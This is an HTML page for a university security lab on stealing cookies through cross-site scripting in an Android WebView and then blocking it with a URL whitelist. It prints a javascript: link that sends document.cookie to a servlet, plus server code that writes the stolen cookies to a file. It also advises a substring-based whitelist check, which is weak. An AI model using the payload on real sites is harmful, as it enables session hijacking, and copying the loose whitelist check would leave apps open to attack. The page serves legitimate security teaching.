<!DOCTYPE html>
<html>
<head>
	<title>Cookie Stealing (Mobile)</title>
	<link rel="stylesheet" href="../style.css">
</head>
<body>
	<div class="wrapper">
		<h1>Cookie Stealing (Mobile)</h1>
		<div class="navlinks">
			<ul class="horizontal">
				<li><a href="../index.html">Home</a></li>
				<li><a href="3.9.1_cross_site_mechanisms.html">Cross Site Mechanisms</a></li>
				<li><a href="cookie_stealing_solution.html">Solution</a></li>
			</ul>
		</div>

		<h2 id="introduction">Introduction</h2>
		<p>
			For this exercise, we are going to work on cookie stealing via Cross-Site Scripting in a virtual mobile device (Android for this course). Even though Cross-Site Scripting is typically found in web applications, Android devices with the help of <code>Webview</code> component can effectively interact with online resources. Thus, the Cross-Site Scrpting vulnerability still exist.
		</p>
		<p>
			To understand cookie stealing better, let's take a look at cookies first. Cookies, also called HTTP cookies or web cookies, are small files used to store a decent amount of data about a particular client, and can be accessed by the web server to recognize the visitor and customize the web page. 
		</p>

		<p>
			Cookies can be identified by how long they last. Persistent cookies have an expiration date specified by the cookie setter, and will expire at the specific date. The infamous "Remember Me" checkbox at the Portal Login page use persistent login cookies (i.e. a cookies that is saved on disk by the browser) to implement automatically login when user opens the browser again. In contrast, Non-persistent cookies(session cookies) do not have an expiration date and are removed once the user quits his or her browser. This type of cookies are commonly found in online shopping, in which the cookies are usually deleted when you close the browser. There are also other kinds of cookies, such as HttpOnly cookies, Secure cookies, and Third-party cookies. Do more reserach if you are interested. 
		</p>
		<p>
			We've seen how popular and widespread are Http cookies used in the Internet, but they are also a danger zone. When a user successfully logs in to a website such as Facebook, Gmail, etc., the webserver will generate a session token and return to the browser. If an attacker steals the user's authentication cookies via Cross-Site scripting, he or she may replace his own cookies with the victims cookies to hack into the user's Gmail, FaceBook or any othe account. After finishing the exercise, we hope you can understand how cookies stealing works via Cross-Site scripting and more importantly, how to mitigate the vulnerability.
		</p>
		


		<h3 id="description">Exercise Description</h3>
		<p>
			In this exercise we provide a small HTTP server and an Android Project running on Android Studio. The local server will generate a simple web page with a mailicious advertisement. Once clicked, the cookie of the simple web page will be passed as a parameter to a malicious script, which will write the cookie into a file named <code>cookies</code>. We will do all the practices on AVD(Android Virtual Device) provided by Android Studio to simulate the real mobile environment. We use the <code>Webview</code> component of Android Studio to display the web page generated by local server and the <code>CookieManager</code> to set cookies of our web page. Your objective is to understand how the attack happens and mitigate the vulnerability.
		</p>

		<p>
			The program has four source files and one Android project folder: <code>TargetServer.java</code>, <code>MaliciouAd.java</code>, <code>WelcomePage.java</code>, <code>MainActivity.java</code>, and <code>XSSCookieStealing</code>. The servlets are each attached to a URL path on the server, so all requests directed to that path will be handled by that servlet's implementation. The following table summarizes each file's purpose.
		</p>

		<table style="width: 100%" border="1">
			<tr>
				<th>Filename</th>
				<th>URL Path</th>
				<th>Description</th>
			</tr>
			<tr>
				<td><code>TargetServer.java</code></td>
				<td>n/a</td>
				<td>Initializes and starts the vulnerable web server. <b>You will not need to change this file.</b></td>
			</tr>
			<tr>
				<td><code>MaliciousAd.java</code></td>
				<td>localhost:8080/Ad</td>
				<td>Each request to this servlet will generate a file named <code>Cookies</code>, which contains the cookie information of the web page who send the request. <b>You will not need to change this file</b></td>
			</tr>
			<tr>
				<td><code>WelcomePage.java</code></td>
				<td>localhost:8080/</td>
				<td>This servlet displays a simple web page with a malicious advertisement. <b>You will not need to change this file</b></td>
			</tr>
			<tr>
				<td><code>MainActivity.java</code></td>
				<td>n/a</td>
				<td>This is the source code inside the Android project we have provided to you, which displays the web page on Android Virtual Device and set the cookies of the web page. <b>You will need to change this file</b> in part of the mitigation for this exercise.</td>
			</tr>
			<tr>
				<td><code>XSSCookieStealing</code></td>
				<td>n/a</td>
				<td>This is the Android project that you need to import into Android Studio and run on a Android Virtual Device. <b>You will need to change source code of this file</b> in part of the mitigation for this exercise.</td>
			</tr>
		</table>

		<h3 id="mitigation_description">Vulnerability Mitigation</h3>
		<p>
			As you have seen in previous Cross-Site scripting exercises, there are many ways to prevent the attack. For this exercise, we will still use the whitelisting approach, but it is a little bit different from what we did before. We will focus on revising the Android source code instead of codes on the server side to mitigate the vulnerability. 
			In more detail, we will use some functionality of <code>WebView</code> in Android Studio to achieve our goal.  
		</p>

		<h2 id="instructions">Exercise Instructions</h2>
		<p>
			Same as the previous XSS mobile exercise, this exercise will be completed with the help of Android Studio(version 3.2.1) and Command Prompt in Windows.
		</p>
		
		<h3>
			<b>First you need to run the web server in Windows</b>
		</h3>

		<ol>

			<li>
				<b>Download XSSCookieStealing(mobile).zip from ~cs637/Exercise/....  to your local host.</b>

				<p>
					Unzip the package to see an android project folder named <code>XSSCookieStealing</code> and several other files listed in the table above. 
				</p>
			</li>


			<li>
				<p>
					<b>Open Command Prompt in Windows</b>
				</p>
				<p>
					To open the Command Prompt, click <b>Windows</b> and type <b>cmd</b> in the search box and choose the result on the top.
				</p>
			</li>

			<li>
				<p>
					<b>Run the server</b>
				</p>
				<ol type="a">
					<li>
						<p>
							In the Command Prompt, <code>cd</code> into the directory containing the unzipped files
						</p>
					</li>


					<li>
						<p>
							Every time you change the a .java file, you must recompile the program before running it again. Enter the following command to compile the program:
						</p>
						<pre><code>javac -Djava.ext.dirs=./lib *.java</code></pre>
					</li>


					<li>
						<p>
							This program depends on files in the lib directory, so the command to run the server in Windows is:
						</p>
						<pre><code>java -Djava.ext.dirs=./lib TargetServer</code></pre>
					</li>


					<li>
						<p>
							To stop the server, type <code>quit</code> in the command line interface and press enter. 
						</p>
					</li>


				</ol>
			</li>	
		</ol>








		<h3>
			<b>Then you need to run the Android Project from Android Studio</b>
		</h3>


		<ol> 			
			<li>
				<p>
					<b>You should have successfully downloaded the Android Studio(3.2.1) and created your own AVD correctly from the previous exercise. If not, please go back and follow the instructions <a href = "XSSAttack-win.html" target="_blank">there</a></b>
				</p>
			</li>


			<li>
				<p>
					<b>Open the Android Studio and click "File" -> "open" -> "XSSCookieStealing" to load the project</b>
				</p>
			</li>
			<li>
				<p>
					<b>Run the project</b>
				</p>
				<p>
					Click the <b>Run</b> button in the Android Studio and choose the AVD you have created as the deployment target.
				</p>
				<p>
					The first page you see has two basic elements of web pages nowadays: contents and advertisements. The advertisement in our website is not for advertising, but for malicious attackers to acquire users' cookies.

					If you click the <code>Advertisement</code> link, you will redirect to another page saying "Your cookies have been stolen", and a file named <code>Cookies</code> will be generated in the directory where you run the server. In real life, the malicious ads may steal uesrs' cookies and go back to the original web page as if nothing happens, given that attackers are not kind enough to remind you that you were hacked just now.
				</p>
				<p>
					Open the <code>Cookies</code> file, and if everything works fine, you can find the stolen cookies here, which is exactly what we have set in the Android Studio source code.  
				</p>
			</li> 	
		</ol>
		<h2 id="inspect" class="steps">Inspect the Program Code</h2>
		<p>
			As mentioned in the introduction part, cookies are small pieces of data sent by a web server to user's computer to record some stateful information. Since you are the one who run the local server(also the one who steals the cookies), you can decide what information included in the cookies. Here we use <code>CookieManager</code> in Android Studio to set the cookies of our web page. To inspect the source code in Android Studio, change the project structure on the top left to <b>Android</b>, and click <b>app</b> -> <b>java</b> -> <b>com.wisc.xsscookiestealing</b> -> <b>MainActivity</b>. 
		</p>

		<p>
			In <code>MainActivity.java</code>, you should notice the following code section:
		</p>


		<pre><code>//create a CookieManager object
        	final CookieManager cookieManager = CookieManager.getInstance();
        	cookieManager.setAcceptCookie(true);
        	//set the cookies of the domain
        	cookieManager.setCookie(domain, "name = SESSIONID");
        	//enable cookies
        	CookieManager.getInstance().setAcceptCookie(true);</code></pre>
		
		<p>
			Spend some time looking at the code and ask yourself: How to set the cookies of the web page? What kind of information can be included in the cookies? Are the stolen cookies the same as the cookies here? Check the <a href = "https://developer.android.com/reference/android/webkit/CookieManager" target="_blank">CookieManager API</a> for more details.
		</p>

		<p>
			Let's also take a look at the implementation of the local server. Focus on the <code>WelcomePage.java</code> and <code>MaliciousAd.java</code> files first. Use your favorite text editor to open these files. Enter the following command to open each file in Vim:
		</p>

		<pre><code>
		$ vim WelcomePage.java
		$ vim MaliciousAd.java</code></pre>

		<p>
			In <code>WelcomePage.java</code>, you should notice the following code section:
		</p>

		<pre><code>//use javascript to pass cookies of current webpage to malicious attackers
	    	content.println("&ltp&gt&lta href = 'javascript:location.href = \"http://10.0.2.2:8080/Ad?username=\" + document.cookie'>");
 		content.println("Advertisement");
		content.println("&lt/a&gt&lt/p&gt");</code></pre>

		

		<p>
			In <code>MaliciousAd.java</code>, you should notice this code section:
		</p>

		<pre><code>//write the cookies into a file named Cookies
		FileWriter fileWriter = new FileWriter("Cookies");
		PrintWriter printWriter = new PrintWriter(fileWriter);
		printWriter.print("Stolen cookies:\n"); 
		printWriter.print(name);</code></pre>

		<h2 id="exploit" class="steps">Exploit the Vulnerability</h2>
		<p>
			For this exercise you don't need to exploit the vulnerability(which we have done for you), but focus on mitigating the vulnerability.
		</p>


		<h2 id="mitigate" class="steps">Mitigate the Vulnerability</h2>
		<p>
			As mentioned ealier, we are going to use whitelisting approach for the mitigation. If you 
			are not familiar with this technique(should not be the case), you can go back to <a href = "XSSAttack-win.html">previous exercise</a> for more details.
		</p>
	    <p>
	    	Before starting the mitigation, ask yourself a question: "What if the user doesn't click the advertisement?"" The answer is straightforward: the attacker cannot acquire the user's cookies. However, as a developer, we are supposed to protect every user's privacy as best we can, so we cannot assume that every user is smart enough to avoid those traps. The question now is: "How to prevent user from accessing the malicious web page?" Try to think about hooking and whitelisting approach. 
	    </p>

		<p> 
			If you are thinking about intercepting the malicious HTTP request, then you are on the right track. A possible solution is to block all redirection from our web page to a new URL, but in most time our website do need redirections to trusted pages, and that is where whitelisting approach can help. A whitelist with trusted URLs can effectively filter out possibly malicious web pages. Now we have came up with a general solution: intercept all HTTP requests from our website and use whitelisting approach to filter out invalid URLs, but how do we implement it? 
		</p>
		<p>
			Your first task is to read and store all trusted URLs from the whitelist, which is a file provided under <b>app</b>-><b>assets</b>-><b>whitelist</b> in your Android Studio. Reading from assets in Android Studio is no different from reading files in Java, except that you might use the return value of <code>getAssets().open(filename)</code> method as an inpustream.
		</p>
		<p>
			Next, you will need to intercept the HTTP requests. Remember that we use <code>WebView</code> objects in Android Studio to display web pages. We can open desired web pages by simply calling <code>loadUrl(String url)</code> method. However, when you click any link inside the web page, by default Android will launch another application(default browser) to handles URLs, instead of loading URLs within the WebView. To fully control the behavior of URL forwarding, we normally provide a <code>WebViewClient</code> object for our WebView, using <code>setWebViewClient()</code> method. See <a href = "https://developer.android.com/reference/android/webkit/WebView">WebView API</a> for more details about thoes two methods.

		</p>
		<p>
			If you look at MainActivity.java in Android Studio, you may notice that we have provided you both methods mentioned above. The key to control the url loading is <code>WebViewClient</code> object. In particular, the <code>shouldOverrideUrlLoading</code> method(the one added in API 24). See <a href = "https://developer.android.com/reference/android/webkit/WebViewClient">WebViewClient API</a> for more information.
		</p>
		<p>
			By now you should have stored the trusted URLs and understand the mechanism of <code>shouldOverrideUrlLoading</code> method. The last thing you need to do is loading URLs that contain any trusted URLs listed in the whitelist and block all the others with a warning message. Make sure using <code>contain</code> instead of <code>equals</code> in URL comparison and try to think about the reason behind it. To print the warning message, you can use <code>webView.loadUrl("javascript: alert('...')")</code> or other methods you want.
		</p> 
		<p>
			To test your mitigation, shut down and restart both local server and Android Virtual Device and click the malicious advertisement again. If you see a warning message appears and no <code>cookies</code> file generated, you are almost done! To see if the whitelist works as expected, you can change this line of code in <code>WelcomePage.java</code>
			<pre><code>content.println("&ltp&gt&lta href = 'javascript:location.href = \"http://10.0.2.2:8080/Ad?username=\" + document.cookie'>");
			</code></pre> into:
			<pre><code>content.println("&ltp&gt&lta href = 'www.wisc.edu'>");
			</code></pre> 
			Now if you click the malicious advertisement again, you should load into our school website successfully(listed in the whitelist).
		</p>
		<p>
			Congratulations! You have mitigated another Cross-Site scripting vulnerability.
		</p>
	</div>
</body>
</html>
